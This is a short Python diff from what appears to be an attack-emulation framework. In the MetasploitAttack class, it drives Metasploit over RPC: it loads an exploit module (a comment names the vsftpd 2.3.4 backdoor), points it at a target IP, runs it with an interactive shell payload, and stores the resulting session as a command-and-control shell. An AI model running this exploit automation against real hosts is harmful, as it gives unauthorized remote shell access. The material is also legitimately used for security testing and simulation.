@@ -12,6 +12,7 @@ import uuid
 import xml.etree.ElementTree as ET
 from Data.Techniques.ClientsData import ClientsData
 from pymetasploit3.msfrpc import *
+import time
 
 # This is intended to be run on the starting malicious attacker client
 
@@ -49,7 +50,18 @@ class MetasploitAttack(InitialAccessAttack):
         # This breaks because it tries to run payload and assumes it's a module
         # Todo: make work for multiple OSes by dynamically chaning payload
         # Todo: Change determining if attack was successful or not
-        #output = self.exploitModule.execute(payload='cmd/unix/interact')
-        output = self.exploitModule.execute()
-        metasploitShell = metasploitServer.getLatestSession()
-        targetHost.c2Shells.append(metasploitShell)
+
+        # This is erroring out with Invalid Authentication Token
+        #client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
+        refreshed = metasploitServer.metasploitServer.modules.use('exploit', self.exploitModule.info['fullname'])
+        refreshed['RHOSTS'] = targetHost.ipAddress
+        output = refreshed.execute(payload='cmd/unix/interact')
+        time.sleep(5)
+        #output = self.exploitModule.execute(payloads='cmd/unix/interact')
+        #output = self.exploitModule.execute()
+        try:
+            metasploitShell = metasploitServer.getLatestSession(targetHost.ipAddress)
+            targetHost.c2Shells.append(metasploitShell)
+        except Exception:
+            pass
+        return
